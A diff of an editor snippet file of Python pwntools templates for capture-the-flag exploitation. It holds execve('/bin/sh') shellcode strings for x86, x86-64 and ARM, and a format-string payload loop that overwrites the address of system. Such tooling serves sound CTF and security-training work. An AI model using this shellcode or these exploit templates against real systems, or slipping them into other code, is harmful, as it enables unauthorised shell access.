@@ -1,38 +1,35 @@
 #python snippets for ctf
 snippet pwn
-	#!/usr/bin/env python
-	# -*- coding: utf-8 -*-
-	from pwnpwnpwn import *
-	from pwn import *
-	
-	host = "10.211.55.23"
-	port = 8888
-	
-	r = remote(host,port)
-snippet ctf
-	#!/usr/bin/env python
-	# -*- coding: utf-8 -*-
-	from pwnpwnpwn import *
-	import re
+        #!/usr/bin/env python
+        # -*- coding: utf-8 -*-
+        from pwn import *
 
-	host = "10.211.55.16"
-	port = 8888
-	
-	sock = make_conn(host,port)
+        binary = ${1}
+        elf = ELF(binary)
+        libc = elf.libc
+
+        io = process(binary)
+        context.log_level = 'debug'
+        pause()
+
+        ${2}
+
+        io.interactive()
 snippet sc32
-	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 snippet sc64
-	"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
-snippet scarm
-	"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
+        "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+snippet scairm
+        "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
 snippet r
-	r.recvuntil("${1}")
+        io.recvuntil("${1}")
 snippet s
-	r.sendline(${1})
+        io.sendline(${1})
+
 snippet inter
-	r.interactive()
+        io.interactive()
 snippet fmt
-	prev = ""
-	for i in range(${1}):
-		payload += fmtchar(${2},(system >> i) & 0xff,${3})
-		prev = (system >> i) & 0xff
+        prev = ""
+        for i in range(${1}):
+                payload += fmtchar(${2},(system >> i) & 0xff,${3})
+                prev = (system >> i) & 0xff
